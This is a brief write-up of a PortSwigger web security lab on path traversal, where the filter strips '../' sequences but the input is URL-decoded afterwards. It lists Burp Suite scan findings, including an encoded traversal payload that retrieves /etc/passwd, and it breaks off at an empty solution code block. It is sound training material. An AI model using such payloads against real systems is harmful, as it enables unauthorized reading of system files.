# [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

## Lab

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Scan

- burpsuite intruder payload `path traversal (single file)` contains double_encoding

- burpsuite scanner detected
  - `File path traversal`
  - `/image`
  - The payload `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` was submitted in the filename parameter. The requested file was returned in the application's response.

## Solutions

double_encoding(`../../../../../../etc/passwd`):

```http
